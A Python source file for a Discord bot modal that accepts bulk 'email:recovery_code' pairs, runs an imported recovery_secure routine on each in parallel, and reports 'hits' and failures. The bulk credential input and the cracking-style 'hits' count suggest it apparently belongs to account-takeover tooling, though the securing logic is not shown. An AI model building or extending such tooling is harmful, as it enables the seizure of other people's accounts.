from discord import ui
import discord

from securing.recovery_secure import recovery_secure
from ui.modals.bulk_utils import run_bulk_parallel


class BulkRecoveryCodeModal(ui.Modal):
    def __init__(self):
        super().__init__(title="Bulk Recovery Code Securing")
        self.add_item(ui.InputText(
            label="Accounts (one per line)",
            style=discord.InputTextStyle.long,
            placeholder="email1:recovery_code1\nemail2:recovery_code2",
            required=True
        ))

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        lines = self.children[0].value.strip().splitlines()
        jobs: list[tuple[str, object]] = []
        failures = 0
        failed_emails: list[str] = []

        for line in lines:
            line = line.strip()
            if not line:
                continue

            parts = line.split(":", 1)
            if len(parts) != 2:
                failures += 1
                failed_emails.append(f"`{line[:30]}...` (invalid format)")
                continue

            email, recovery_code = parts[0].strip(), parts[1].strip()
            jobs.append((
                email,
                lambda e=email, rc=recovery_code, **kwargs: recovery_secure(
                    e, "rcode", {"recovery_code": rc}, **kwargs
                ),
            ))

        count = len(jobs)
        processing_embed = discord.Embed(
            title="Processing Bulk Secure",
            description=(
                f"Processing **{count + failures}** accounts in parallel "
                f"({count} securing, {failures} skipped)..."
            ),
            color=0x2765F5,
        )
        processing_msg = await interaction.followup.send(embed=processing_embed, ephemeral=True)

        hits = 0
        try:
            hits, run_failures, run_failed = await run_bulk_parallel(interaction.user, jobs)
            failures += run_failures
            failed_emails.extend(run_failed)
        finally:
            summary_embed = discord.Embed(
                title="Bulk Secure Complete",
                color=0x2765F5,
            )
            summary_embed.add_field(name="Processed", value=str(hits + failures), inline=True)
            summary_embed.add_field(name="Hits", value=str(hits), inline=True)
            summary_embed.add_field(name="Failed", value=str(failures), inline=True)

            if failed_emails:
                # Discord embed field value max is 1024 chars. Long RuntimeError
                # reasons used to blow this up and hide the whole summary.
                lines: list[str] = []
                budget = 1000
                omitted = 0
                for entry in failed_emails:
                    line = entry if len(entry) <= 180 else entry[:177] + "..."
                    if sum(len(x) + 1 for x in lines) + len(line) + 1 > budget:
                        omitted += 1
                        continue
                    lines.append(line)
                if omitted:
                    lines.append(f"...and {omitted} more")
                summary_embed.add_field(
                    name="Failed Accounts",
                    value="\n".join(lines) or "(see DMs)",
                    inline=False,
                )

            try:
                await processing_msg.edit(embed=summary_embed)
            except discord.HTTPException:
                try:
                    await interaction.followup.send(embed=summary_embed, ephemeral=True)
                except discord.HTTPException:
                    # Last resort — counts only, no failed list
                    tiny = discord.Embed(
                        title="Bulk Secure Complete",
                        description=(
                            f"Processed **{hits + failures}** · "
                            f"Hits **{hits}** · Failed **{failures}**\n"
                            f"(Failed list omitted — check DMs for details.)"
                        ),
                        color=0x2765F5,
                    )
                    await interaction.followup.send(embed=tiny, ephemeral=True)
